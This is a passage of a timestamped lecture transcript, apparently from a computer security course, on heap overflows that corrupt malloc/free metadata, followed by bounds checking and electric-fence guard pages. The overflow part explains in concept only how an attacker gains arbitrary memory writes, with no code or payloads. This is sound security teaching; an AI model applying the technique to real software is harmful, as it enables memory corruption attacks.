              <text_slice>assigned to them-- are nearby,
in terms of the layout in terms</text_slice>
            </slice>
            <slice>
              <time_slice>45:22</time_slice>
              <text_slice>of [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>45:23</time_slice>
              <text_slice>So both of these objects
line next to each other</text_slice>
            </slice>
            <slice>
              <time_slice>45:27</time_slice>
              <text_slice>in the memory space.</text_slice>
            </slice>
            <slice>
              <time_slice>45:30</time_slice>
              <text_slice>There's some subtle and evil
things that can happen, right?</text_slice>
            </slice>
            <slice>
              <time_slice>45:34</time_slice>
              <text_slice>Because this third copy
here might actually over--</text_slice>
            </slice>
            <slice>
              <time_slice>45:39</time_slice>
              <text_slice>it'll fill p with
a bunch of stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>45:41</time_slice>
              <text_slice>but it might also corrupt some
of the state that belongs to q.</text_slice>
            </slice>
            <slice>
              <time_slice>45:47</time_slice>
              <text_slice>OK?</text_slice>
            </slice>
            <slice>
              <time_slice>45:48</time_slice>
              <text_slice>And this can cause problems.</text_slice>
            </slice>
            <slice>
              <time_slice>45:49</time_slice>
              <text_slice>And some of you may
have done things</text_slice>
            </slice>
            <slice>
              <time_slice>45:50</time_slice>
              <text_slice>in this unintentionally
in your own code, when</text_slice>
            </slice>
            <slice>
              <time_slice>45:52</time_slice>
              <text_slice>you have some type of
weird use of pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>45:55</time_slice>
              <text_slice>And then stuff seems
to work, but when</text_slice>
            </slice>
            <slice>
              <time_slice>45:56</time_slice>
              <text_slice>you call free later
on, it segfaults</text_slice>
            </slice>
            <slice>
              <time_slice>45:58</time_slice>
              <text_slice>or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>45:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>46:00</time_slice>
              <text_slice>What I'm going to
talk about here</text_slice>
            </slice>
            <slice>
              <time_slice>46:01</time_slice>
              <text_slice>is the way that the
attacker can take</text_slice>
            </slice>
            <slice>
              <time_slice>46:03</time_slice>
              <text_slice>advantage of that behavior.</text_slice>
            </slice>
            <slice>
              <time_slice>46:04</time_slice>
              <text_slice>We're actually going to
explain why that happens.</text_slice>
            </slice>
            <slice>
              <time_slice>46:06</time_slice>
              <text_slice>So imagine that inside
the implementation</text_slice>
            </slice>
            <slice>
              <time_slice>46:12</time_slice>
              <text_slice>of free and malloc, an
allocated block looks like this.</text_slice>
            </slice>
            <slice>
              <time_slice>46:21</time_slice>
              <text_slice>So let's say that there is the
app-visible data that lives up</text_slice>
            </slice>
            <slice>
              <time_slice>46:29</time_slice>
              <text_slice>here.</text_slice>
            </slice>
            <slice>
              <time_slice>46:29</time_slice>
              <text_slice>And then let's say you had
a size variable down here.</text_slice>
            </slice>
            <slice>
              <time_slice>46:35</time_slice>
              <text_slice>This is not something that
the application sees directly.</text_slice>
            </slice>
            <slice>
              <time_slice>46:38</time_slice>
              <text_slice>This is like some
bookkeeping info</text_slice>
            </slice>
            <slice>
              <time_slice>46:40</time_slice>
              <text_slice>that the free or
the malloc systems</text_slice>
            </slice>
            <slice>
              <time_slice>46:43</time_slice>
              <text_slice>attract so that you know
the sizes of the buffer</text_slice>
            </slice>
            <slice>
              <time_slice>46:45</time_slice>
              <text_slice>that it allocated.</text_slice>
            </slice>
            <slice>
              <time_slice>46:47</time_slice>
              <text_slice>Let's say that free block
has some metadata that</text_slice>
            </slice>
            <slice>
              <time_slice>46:55</time_slice>
              <text_slice>looks like this.</text_slice>
            </slice>
            <slice>
              <time_slice>47:03</time_slice>
              <text_slice>You've got the size of
the free block here.</text_slice>
            </slice>
            <slice>
              <time_slice>47:06</time_slice>
              <text_slice>And then you've got a
bunch of empty space here.</text_slice>
            </slice>
            <slice>
              <time_slice>47:09</time_slice>
              <text_slice>Then let's say-- this is
where things get interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>47:11</time_slice>
              <text_slice>You've got a backwards
pointer and then</text_slice>
            </slice>
            <slice>
              <time_slice>47:17</time_slice>
              <text_slice>you've got a forward pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>47:25</time_slice>
              <text_slice>And maybe you've got
some size data here.</text_slice>
            </slice>
            <slice>
              <time_slice>47:27</time_slice>
              <text_slice>Now why are we having
these two pointers here?</text_slice>
            </slice>
            <slice>
              <time_slice>47:28</time_slice>
              <text_slice>It's because the
memory allocation</text_slice>
            </slice>
            <slice>
              <time_slice>47:30</time_slice>
              <text_slice>system, in this case, is
using a doubly-linked list</text_slice>
            </slice>
            <slice>
              <time_slice>47:33</time_slice>
              <text_slice>to track how the free blocks
related to each other.</text_slice>
            </slice>
            <slice>
              <time_slice>47:37</time_slice>
              <text_slice>So when you allocate
a free block,</text_slice>
            </slice>
            <slice>
              <time_slice>47:39</time_slice>
              <text_slice>you take it off of this
doubly-linked list.</text_slice>
            </slice>
            <slice>
              <time_slice>47:41</time_slice>
              <text_slice>And then when you deallocate it,
you do some pointer arithmetic,</text_slice>
            </slice>
            <slice>
              <time_slice>47:45</time_slice>
              <text_slice>and then you fix
these things up.</text_slice>
            </slice>
            <slice>
              <time_slice>47:46</time_slice>
              <text_slice>Then you add it back to
that linked list, right?</text_slice>
            </slice>
            <slice>
              <time_slice>47:48</time_slice>
              <text_slice>So as always, whenever you
hear pointer arithmetic,</text_slice>
            </slice>
            <slice>
              <time_slice>47:51</time_slice>
              <text_slice>you should think
it's your canary.</text_slice>
            </slice>
            <slice>
              <time_slice>47:52</time_slice>
              <text_slice>Because that's where a lot
of these problems come about.</text_slice>
            </slice>
            <slice>
              <time_slice>47:55</time_slice>
              <text_slice>And so the thing to note is
that we had this buffer overflow</text_slice>
            </slice>
            <slice>
              <time_slice>48:01</time_slice>
              <text_slice>here, the p.</text_slice>
            </slice>
            <slice>
              <time_slice>48:03</time_slice>
              <text_slice>If we assume that p and
q are next to each other,</text_slice>
            </slice>
            <slice>
              <time_slice>48:05</time_slice>
              <text_slice>or very close in memory, then
what can end up happening</text_slice>
            </slice>
            <slice>
              <time_slice>48:08</time_slice>
              <text_slice>is that this buffer
overflow can overwrite</text_slice>
            </slice>
            <slice>
              <time_slice>48:12</time_slice>
              <text_slice>some of this size data for
the allocated pointer, q.</text_slice>
            </slice>
            <slice>
              <time_slice>48:19</time_slice>
              <text_slice>Is everybody with me so far?</text_slice>
            </slice>
            <slice>
              <time_slice>48:20</time_slice>
              <text_slice>Because if you're with me
so far, then basically,</text_slice>
            </slice>
            <slice>
              <time_slice>48:22</time_slice>
              <text_slice>you can use your
imagination at this point</text_slice>
            </slice>
            <slice>
              <time_slice>48:24</time_slice>
              <text_slice>and see where things go wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>48:26</time_slice>
              <text_slice>Because essentially,
what's going</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>to end up happening is that
these free operations-- they</text_slice>
            </slice>
            <slice>
              <time_slice>48:31</time_slice>
              <text_slice>look at this metadata to do all
kinds of pointer manipulations</text_slice>
            </slice>
            <slice>
              <time_slice>48:35</time_slice>
              <text_slice>with this kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>Somewhere in the
implementation of free,</text_slice>
            </slice>
            <slice>
              <time_slice>48:56</time_slice>
              <text_slice>it's going to get
some pointer based</text_slice>
            </slice>
            <slice>
              <time_slice>49:05</time_slice>
              <text_slice>on the value of size,
where size is something</text_slice>
            </slice>
            <slice>
              <time_slice>49:11</time_slice>
              <text_slice>the attacker controls.</text_slice>
            </slice>
            <slice>
              <time_slice>49:12</time_slice>
              <text_slice>Because the attacker
did the buffer overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>49:14</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>49:14</time_slice>
              <text_slice>So then, you can
imagine that it does</text_slice>
            </slice>
            <slice>
              <time_slice>49:18</time_slice>
              <text_slice>a bunch of pointer arithmetic.</text_slice>
            </slice>
            <slice>
              <time_slice>49:25</time_slice>
              <text_slice>So it's going to look
at the back in the four</text_slice>
            </slice>
            <slice>
              <time_slice>49:28</time_slice>
              <text_slice>pointers of this block.</text_slice>
            </slice>
            <slice>
              <time_slice>49:33</time_slice>
              <text_slice>And then it's going
to do something</text_slice>
            </slice>
            <slice>
              <time_slice>49:35</time_slice>
              <text_slice>like update the back pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>49:41</time_slice>
              <text_slice>And also update the
forward pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>49:49</time_slice>
              <text_slice>And the exact
specifics of this-- you</text_slice>
            </slice>
            <slice>
              <time_slice>49:51</time_slice>
              <text_slice>don't need to worry about.</text_slice>
            </slice>
            <slice>
              <time_slice>49:52</time_slice>
              <text_slice>This is just an example of the
code that takes place in there.</text_slice>
            </slice>
            <slice>
              <time_slice>49:55</time_slice>
              <text_slice>But the point is that note
that because the attacker's</text_slice>
            </slice>
            <slice>
              <time_slice>49:58</time_slice>
              <text_slice>overwritten size,
the attacker now</text_slice>
            </slice>
            <slice>
              <time_slice>50:00</time_slice>
              <text_slice>controls this pointer that's
passed into the free code.</text_slice>
            </slice>
            <slice>
              <time_slice>50:03</time_slice>
              <text_slice>And because of that,
these two statements</text_slice>
            </slice>
            <slice>
              <time_slice>50:06</time_slice>
              <text_slice>here, these are actually
pointer updates.</text_slice>
            </slice>
            <slice>
              <time_slice>50:08</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>50:09</time_slice>
              <text_slice>This is a pointer somewhere.</text_slice>
            </slice>
            <slice>
              <time_slice>50:10</time_slice>
              <text_slice>And because the attacker has
been able to control this p,</text_slice>
            </slice>
            <slice>
              <time_slice>50:15</time_slice>
              <text_slice>he actually controls
all this stuff, too.</text_slice>
            </slice>
            <slice>
              <time_slice>50:17</time_slice>
              <text_slice>This is where the attack
can actually take place.</text_slice>
            </slice>
            <slice>
              <time_slice>50:20</time_slice>
              <text_slice>So when the free
code operates and it</text_slice>
            </slice>
            <slice>
              <time_slice>50:22</time_slice>
              <text_slice>tries to do things like,
for example, merge these two</text_slice>
            </slice>
            <slice>
              <time_slice>50:25</time_slice>
              <text_slice>blocks, that's
typically why you have</text_slice>
            </slice>
            <slice>
              <time_slice>50:27</time_slice>
              <text_slice>[INAUDIBLE] doubly-linked list.</text_slice>
            </slice>
            <slice>
              <time_slice>50:28</time_slice>
              <text_slice>Because if you have two blocks
that are facing to each other</text_slice>
            </slice>
            <slice>
              <time_slice>50:30</time_slice>
              <text_slice>and they're both free, you want
to merge them to one big block.</text_slice>
            </slice>
            <slice>
              <time_slice>50:33</time_slice>
              <text_slice>Well, we control size.</text_slice>
            </slice>
            <slice>
              <time_slice>50:36</time_slice>
              <text_slice>That means we control
this whole process here.</text_slice>
            </slice>
            <slice>
              <time_slice>50:38</time_slice>
              <text_slice>That means if we've been clever
in how these overflows are</text_slice>
            </slice>
            <slice>
              <time_slice>50:41</time_slice>
              <text_slice>working, at these points, we
can write to a memory in the way</text_slice>
            </slice>
            <slice>
              <time_slice>50:44</time_slice>
              <text_slice>that we choose.</text_slice>
            </slice>
            <slice>
              <time_slice>50:46</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>50:49</time_slice>
              <text_slice>And like I said,
this type of thing</text_slice>
            </slice>
            <slice>
              <time_slice>50:50</time_slice>
              <text_slice>often happens in your own
code when you're not getting</text_slice>
            </slice>
            <slice>
              <time_slice>50:52</time_slice>
              <text_slice>very clever with pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>50:54</time_slice>
              <text_slice>When you make some mistake with
the double freeing or whatever,</text_slice>
            </slice>
            <slice>
              <time_slice>50:56</time_slice>
              <text_slice>this is why stuff will
segfault sometimes.</text_slice>
            </slice>
            <slice>
              <time_slice>50:59</time_slice>
              <text_slice>Because you've messed
up this metadata</text_slice>
            </slice>
            <slice>
              <time_slice>51:01</time_slice>
              <text_slice>that lives with each one
of these allocated blocks.</text_slice>
            </slice>
            <slice>
              <time_slice>51:03</time_slice>
              <text_slice>And then at some
point, this calculation</text_slice>
            </slice>
            <slice>
              <time_slice>51:05</time_slice>
              <text_slice>will point to some garbage
value, and then you're dead.</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>But if you're the attacker, you
can actually choose that value</text_slice>
            </slice>
            <slice>
              <time_slice>51:11</time_slice>
              <text_slice>and use it for
your own advantage.</text_slice>
            </slice>
            <slice>
              <time_slice>51:17</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>51:17</time_slice>
              <text_slice>So now let's get
to another approach</text_slice>
            </slice>
            <slice>
              <time_slice>51:22</time_slice>
              <text_slice>for getting rid of some of
these buffer overflow attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>51:27</time_slice>
              <text_slice>And that approach
is bounds checking.</text_slice>
            </slice>
            <slice>
              <time_slice>51:38</time_slice>
              <text_slice>The goal of bounds
checking is to make sure</text_slice>
            </slice>
            <slice>
              <time_slice>51:45</time_slice>
              <text_slice>that when you use a
particular pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>51:48</time_slice>
              <text_slice>it only refers to something
that is a memory object.</text_slice>
            </slice>
            <slice>
              <time_slice>51:54</time_slice>
              <text_slice>And that pointer's in the valid
bounds of that memory object.</text_slice>
            </slice>
            <slice>
              <time_slice>51:58</time_slice>
              <text_slice>So that's the basic
idea behind the idea.</text_slice>
            </slice>
            <slice>
              <time_slice>52:00</time_slice>
              <text_slice>It's actually pretty
simple-- at a high level.</text_slice>
            </slice>
            <slice>
              <time_slice>52:03</time_slice>
              <text_slice>Once again, in C, though,
it's very difficult</text_slice>
            </slice>
            <slice>
              <time_slice>52:05</time_slice>
              <text_slice>to actually understand things.</text_slice>
            </slice>
            <slice>
              <time_slice>52:07</time_slice>
              <text_slice>Like, what does it
actually mean for a pointer</text_slice>
            </slice>
            <slice>
              <time_slice>52:08</time_slice>
              <text_slice>to be in bounds or out of
bounds, or valid or invalid?</text_slice>
            </slice>
            <slice>
              <time_slice>52:11</time_slice>
              <text_slice>So for example, let's
say that you have</text_slice>
            </slice>
            <slice>
              <time_slice>52:13</time_slice>
              <text_slice>two pieces of code like this.</text_slice>
            </slice>
            <slice>
              <time_slice>52:16</time_slice>
              <text_slice>So you declare a character
array of 1,024 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>52:24</time_slice>
              <text_slice>And then let's say that you
use something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>52:29</time_slice>
              <text_slice>You declare a pointer,
and then you'd</text_slice>
            </slice>
            <slice>
              <time_slice>52:32</time_slice>
              <text_slice>get the address of one
of the elements in x.</text_slice>
            </slice>
            <slice>
              <time_slice>52:41</time_slice>
              <text_slice>Does this make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>52:43</time_slice>
              <text_slice>Is this a good idea to do that?</text_slice>
            </slice>
            <slice>
              <time_slice>52:45</time_slice>
              <text_slice>It's hard to say.</text_slice>
            </slice>
            <slice>
              <time_slice>52:46</time_slice>
              <text_slice>If you're treating this
x up here as a string,</text_slice>
            </slice>
            <slice>
              <time_slice>52:50</time_slice>
              <text_slice>maybe it makes sense for Jim
to take a pointer like this.</text_slice>
            </slice>
            <slice>
              <time_slice>52:52</time_slice>
              <text_slice>Then you can increment and
decrement, because maybe you're</text_slice>
            </slice>
            <slice>
              <time_slice>52:54</time_slice>
              <text_slice>looking for some special value
of your character in there.</text_slice>
            </slice>
            <slice>
              <time_slice>52:57</time_slice>
              <text_slice>But if this is a network
message or something like that,</text_slice>
            </slice>
            <slice>
              <time_slice>53:00</time_slice>
              <text_slice>maybe there's actually some
struct that's embedded in here.</text_slice>
            </slice>
            <slice>
              <time_slice>53:04</time_slice>
              <text_slice>So it doesn't
actually make sense</text_slice>
            </slice>
            <slice>
              <time_slice>53:05</time_slice>
              <text_slice>to walk this character
by character, right?</text_slice>
            </slice>
            <slice>
              <time_slice>53:07</time_slice>
              <text_slice>So the challenge here
is that, once again, we</text_slice>
            </slice>
            <slice>
              <time_slice>53:09</time_slice>
              <text_slice>can see it allows you
to do whatever you want.</text_slice>
            </slice>
            <slice>
              <time_slice>53:12</time_slice>
              <text_slice>It's hard to determine what it
is you actually want it to do.</text_slice>
            </slice>
            <slice>
              <time_slice>53:15</time_slice>
              <text_slice>And so, as a result,
it's a little bit</text_slice>
            </slice>
            <slice>
              <time_slice>53:18</time_slice>
              <text_slice>subtle with how
you define things</text_slice>
            </slice>
            <slice>
              <time_slice>53:19</time_slice>
              <text_slice>like pointer safety in C.</text_slice>
            </slice>
            <slice>
              <time_slice>53:23</time_slice>
              <text_slice>You can also imagine that life
gets even more complicated</text_slice>
            </slice>
            <slice>
              <time_slice>53:26</time_slice>
              <text_slice>if you use structs and unions.</text_slice>
            </slice>
            <slice>
              <time_slice>53:30</time_slice>
              <text_slice>Imagine you had a union.</text_slice>
            </slice>
            <slice>
              <time_slice>53:32</time_slice>
              <text_slice>It would look like this.</text_slice>
            </slice>
            <slice>
              <time_slice>53:35</time_slice>
              <text_slice>It's got some integer
value in there.</text_slice>
            </slice>
            <slice>
              <time_slice>53:38</time_slice>
              <text_slice>And then you've got some struct.</text_slice>
            </slice>
            <slice>
              <time_slice>53:43</time_slice>
              <text_slice>And then, it has two
integers inside of it.</text_slice>
            </slice>
            <slice>
              <time_slice>53:59</time_slice>
              <text_slice>Don't forget the way that the
unions work is that, basically,</text_slice>
            </slice>
            <slice>
              <time_slice>54:02</time_slice>
              <text_slice>the union's going to
allocate the maximum size</text_slice>
            </slice>
            <slice>
              <time_slice>54:04</time_slice>
              <text_slice>for the largest element.</text_slice>
            </slice>
            <slice>
              <time_slice>54:07</time_slice>
              <text_slice>At any given moment,
you typically</text_slice>
            </slice>
            <slice>
              <time_slice>54:08</time_slice>
              <text_slice>expect that either
this ni will be valid</text_slice>
            </slice>
            <slice>
              <time_slice>54:11</time_slice>
              <text_slice>or this struct s will
be valid, but not both.</text_slice>
            </slice>
            <slice>
              <time_slice>54:14</time_slice>
              <text_slice>So imagine that you had code
that did something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>54:21</time_slice>
              <text_slice>You get a pointer
to address this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>54:33</time_slice>
              <text_slice>So I get an integer pointer to
the address of, in the union,</text_slice>
            </slice>
            <slice>
              <time_slice>54:37</time_slice>
              <text_slice>this struct, and then k.</text_slice>
            </slice>
            <slice>
              <time_slice>54:40</time_slice>
              <text_slice>Well, this reference is
strictly speaking in bounds.</text_slice>
            </slice>
            <slice>
              <time_slice>54:45</time_slice>
              <text_slice>There's memory that's
been allocated for this.</text_slice>
            </slice>
            <slice>
              <time_slice>54:47</time_slice>
              <text_slice>That's not incorrect.</text_slice>
            </slice>
            <slice>
              <time_slice>54:49</time_slice>
              <text_slice>But are you actually, this
moment in program of execution,</text_slice>
            </slice>
            <slice>
              <time_slice>54:51</time_slice>
              <text_slice>treating this union
as one of these guys</text_slice>
            </slice>
            <slice>
              <time_slice>54:54</time_slice>
              <text_slice>or one of these guys?</text_slice>
            </slice>
            <slice>
              <time_slice>54:56</time_slice>
              <text_slice>It's hard to say.</text_slice>
            </slice>
            <slice>
              <time_slice>54:58</time_slice>
              <text_slice>So as a result of these
ambiguous pointers semantics</text_slice>
            </slice>
            <slice>
              <time_slice>55:01</time_slice>
              <text_slice>that can arise in these
C programs, typically,</text_slice>
            </slice>
            <slice>
              <time_slice>55:05</time_slice>
              <text_slice>these bound checking
approaches can only</text_slice>
            </slice>
            <slice>
              <time_slice>55:09</time_slice>
              <text_slice>offer a weaker notion
of pointer correctness.</text_slice>
            </slice>
            <slice>
              <time_slice>55:12</time_slice>
              <text_slice>And so that notion
is as follows.</text_slice>
            </slice>
            <slice>
              <time_slice>55:23</time_slice>
              <text_slice>If you have a pointer
p prime that's</text_slice>
            </slice>
            <slice>
              <time_slice>55:32</time_slice>
              <text_slice>derived from the base
pointer p, then p prime</text_slice>
            </slice>
            <slice>
              <time_slice>55:50</time_slice>
              <text_slice>should only be used to
deference memory that belongs</text_slice>
            </slice>
            <slice>
              <time_slice>56:07</time_slice>
              <text_slice>to the original base pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>56:17</time_slice>
              <text_slice>So for a derived
pointer p prime that's</text_slice>
            </slice>
            <slice>
              <time_slice>56:20</time_slice>
              <text_slice>derived from some
original p, then</text_slice>
            </slice>
            <slice>
              <time_slice>56:23</time_slice>
              <text_slice>p prime should only be used
to deference memory that</text_slice>
            </slice>
            <slice>
              <time_slice>56:25</time_slice>
              <text_slice>belongs to p.</text_slice>
            </slice>
            <slice>
              <time_slice>56:27</time_slice>
              <text_slice>Know that this is a weaker
goal than enforcing completely</text_slice>
            </slice>
            <slice>
              <time_slice>56:31</time_slice>
              <text_slice>correct pointer semantics.</text_slice>
            </slice>
            <slice>
              <time_slice>56:34</time_slice>
              <text_slice>Because for example,
you could still</text_slice>
            </slice>
            <slice>
              <time_slice>56:36</time_slice>
              <text_slice>have weird issues like with
this union here, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>56:41</time_slice>
              <text_slice>Maybe at this particular
point in the program,</text_slice>
            </slice>
            <slice>
              <time_slice>56:43</time_slice>
              <text_slice>it wasn't correct
for the program</text_slice>
            </slice>
            <slice>
              <time_slice>56:45</time_slice>
              <text_slice>to be able to reference that
particular value in the union.</text_slice>
            </slice>
            <slice>
              <time_slice>56:49</time_slice>
              <text_slice>But at least this pointer
reference is imbalanced.</text_slice>
            </slice>
            <slice>
              <time_slice>56:53</time_slice>
              <text_slice>So maybe-- like this example
up here-- maybe this creation</text_slice>
            </slice>
            <slice>
              <time_slice>56:59</time_slice>
              <text_slice>of this pointer here
violated the semantics</text_slice>
            </slice>
            <slice>
              <time_slice>57:02</time_slice>
              <text_slice>of the network
message embedded in x.</text_slice>
            </slice>
            <slice>
              <time_slice>57:04</time_slice>
              <text_slice>But at least you're not
trampling on arbitrary memory.</text_slice>
            </slice>
            <slice>
              <time_slice>57:07</time_slice>
              <text_slice>You're only trampling on the
memory that belongs to you.</text_slice>
            </slice>
            <slice>
              <time_slice>57:11</time_slice>
              <text_slice>And so, in the world of C,
this is considered success.</text_slice>
            </slice>
            <slice>
              <time_slice>57:16</time_slice>
              <text_slice>So that's the basic idea.</text_slice>
            </slice>
            <slice>
              <time_slice>57:17</time_slice>
              <text_slice>Now, the challenge
with enforcing</text_slice>
            </slice>
            <slice>
              <time_slice>57:20</time_slice>
              <text_slice>these types of semantics
here is that, in many cases,</text_slice>
            </slice>
            <slice>
              <time_slice>57:24</time_slice>
              <text_slice>you need help from the compiler.</text_slice>
            </slice>
            <slice>
              <time_slice>57:26</time_slice>
              <text_slice>So you need help
from the compiler.</text_slice>
            </slice>
            <slice>
              <time_slice>57:27</time_slice>
              <text_slice>You typically need
to recompile programs</text_slice>
            </slice>
            <slice>
              <time_slice>57:30</time_slice>
              <text_slice>to enforce these semantics.</text_slice>
            </slice>
            <slice>
              <time_slice>57:32</time_slice>
              <text_slice>That can be a drag for
backwards compatibility.</text_slice>
            </slice>
            <slice>
              <time_slice>57:34</time_slice>
              <text_slice>But this is the basic
notion of bounds checking.</text_slice>
            </slice>
            <slice>
              <time_slice>57:38</time_slice>
              <text_slice>What are some ways that you
can implement bounds checking?</text_slice>
            </slice>
            <slice>
              <time_slice>57:49</time_slice>
              <text_slice>One very simple way is this
notion called electric fencing.</text_slice>
            </slice>
            <slice>
              <time_slice>58:01</time_slice>
              <text_slice>The notion here is that, for
every object that you allocate</text_slice>
            </slice>
            <slice>
              <time_slice>58:06</time_slice>
              <text_slice>on the heap, you allocate
a guard page that's</text_slice>
            </slice>
            <slice>
              <time_slice>58:13</time_slice>
              <text_slice>immediately next to it.</text_slice>
            </slice>
            <slice>
              <time_slice>58:15</time_slice>
              <text_slice>And you set the page
protection on that page, such</text_slice>
            </slice>
            <slice>
              <time_slice>58:18</time_slice>
              <text_slice>that if anybody tries to touch
that, you get a hard fault.</text_slice>
            </slice>
            <slice>
              <time_slice>58:22</time_slice>
              <text_slice>The hard rules say
that's out of bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>58:23</time_slice>
              <text_slice>and then the program
will stop right there.</text_slice>
            </slice>
            <slice>
              <time_slice>58:26</time_slice>
              <text_slice>And so this is a very simple
thing that you can do.</text_slice>
            </slice>
            <slice>
              <time_slice>58:29</time_slice>
              <text_slice>And what's nice about
this approach actually,</text_slice>
            </slice>
            <slice>
              <time_slice>58:31</time_slice>
              <text_slice>is that whenever you have
an invalid memory reference,</text_slice>
            </slice>
            <slice>
              <time_slice>58:34</time_slice>
              <text_slice>this causes a fault
immediately, right.</text_slice>
            </slice>
            <slice>
              <time_slice>58:37</time_slice>
              <text_slice>If you've ever debugged
the Base C or C++ program,</text_slice>
            </slice>
            <slice>
              <time_slice>58:39</time_slice>
              <text_slice>one of the big problems is that
a lot of times when you corrupt</text_slice>
            </slice>
            <slice>
              <time_slice>58:41</time_slice>
              <text_slice>memory, that memory is corrupted
silently, and for a while,</text_slice>
            </slice>
            <slice>
              <time_slice>58:46</time_slice>
              <text_slice>and it isn't until later that
something crashes and then only</text_slice>
            </slice>
            <slice>
              <time_slice>58:49</time_slice>
              <text_slice>then you realize
something happened.</text_slice>
            </slice>
            <slice>
              <time_slice>58:50</time_slice>
              <text_slice>But you don't know
what that something is.</text_slice>
            </slice>
            <slice>
              <time_slice>58:52</time_slice>
              <text_slice>You simply do what they
call heisenbugs, right.</text_slice>
            </slice>
            <slice>
              <time_slice>58:54</time_slice>
              <text_slice>Things that have this notion
of uncertainty in them.</text_slice>
            </slice>
            <slice>
              <time_slice>58:56</time_slice>
              <text_slice>So what's nice about
this is that as soon</text_slice>
            </slice>
            <slice>
              <time_slice>58:58</time_slice>
              <text_slice>as the pointer hits here,
boom, it's a guard page,</text_slice>
            </slice>
            <slice>
              <time_slice>59:00</time_slice>
              <text_slice>everything blows up.</text_slice>
            </slice>
            <slice>
              <time_slice>59:03</time_slice>
              <text_slice>Now can you think
of a disadvantage</text_slice>
            </slice>
            <slice>
              <time_slice>59:05</time_slice>
              <text_slice>with this approach?</text_slice>
            </slice>
            <slice>
              <time_slice>59:06</time_slice>
              <text_slice>AUDIENCE: It takes
longer [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>59:08</time_slice>
              <text_slice>PROFESSOR: Yeah exactly.</text_slice>
            </slice>
            <slice>
              <time_slice>59:10</time_slice>
              <text_slice>So imagine that this
little-- this key thing here</text_slice>
            </slice>
            <slice>
              <time_slice>59:12</time_slice>
              <text_slice>was super, super small, then
I've allocated a whole page</text_slice>
            </slice>
            <slice>
              <time_slice>59:15</time_slice>
              <text_slice>just to make sure that my little
tiny thing here didn't get--</text_slice>
            </slice>
            <slice>
              <time_slice>59:19</time_slice>
              <text_slice>didn't have one of
these pointer attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>59:21</time_slice>
              <text_slice>So this is very space intensive.</text_slice>
            </slice>
            <slice>
              <time_slice>59:23</time_slice>
              <text_slice>And so-- but people don't
really deploy something</text_slice>
            </slice>
            <slice>
              <time_slice>59:25</time_slice>
              <text_slice>like this in production.</text_slice>
            </slice>
            <slice>
              <time_slice>59:28</time_slice>
              <text_slice>This could be useful
for the bugging thing,</text_slice>
            </slice>
            <slice>
              <time_slice>59:29</time_slice>
              <text_slice>but you would never do
this for a real program.</text_slice>
            </slice>
            <slice>
              <time_slice>59:32</time_slice>
              <text_slice>So that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>59:33</time_slice>
              <text_slice>So these electrical fences
are actually pretty-- pretty</text_slice>
            </slice>
            <slice>
              <time_slice>59:36</time_slice>
              <text_slice>simple to understand.</text_slice>
            </slice>
            <slice>
              <time_slice>59:39</time_slice>
              <text_slice>AUDIENCE: Why does that have
to be so large, necessarily?</text_slice>
            </slice>
            <slice>
              <time_slice>59:42</time_slice>
              <text_slice>PROFESSOR: Ah, so the reason is
because this guard page here,</text_slice>
            </slice>
            <slice>
              <time_slice>59:46</time_slice>
              <text_slice>you're typically relying on
the hardware, like page level</text_slice>
            </slice>
            <slice>
              <time_slice>59:50</time_slice>
              <text_slice>protections to deal with
those types of things.</text_slice>
            </slice>
            <slice>
              <time_slice>59:52</time_slice>
              <text_slice>And so there's like
certain memory size</text_slice>
            </slice>
            <slice>
              <time_slice>59:54</time_slice>
              <text_slice>you can set to the size
of the page, according to</text_slice>
            </slice>
            <slice>
              <time_slice>59:56</time_slice>
              <text_slice>[? Hollis ?].</text_slice>
            </slice>
            <slice>
              <time_slice>59:56</time_slice>
              <text_slice>But typically that page
is 4k, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>59:58</time_slice>
              <text_slice>So getting back
to your question,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:00</time_slice>
              <text_slice>this is some like
super small value here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:02</time_slice>
              <text_slice>then yeah [INAUDIBLE]
2 bytes where</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:05</time_slice>
              <text_slice>you got 4k here protecting it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:08</time_slice>
              <text_slice>AUDIENCE: In protecting
[INAUDIBLE] individual</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:11</time_slice>
              <text_slice>[INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:13</time_slice>
              <text_slice>PROFESSOR: Oh sorry
yeah, yeah so by heap I</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:14</time_slice>
              <text_slice>mean like heap object.</text_slice>
            </slice>
            <slice>
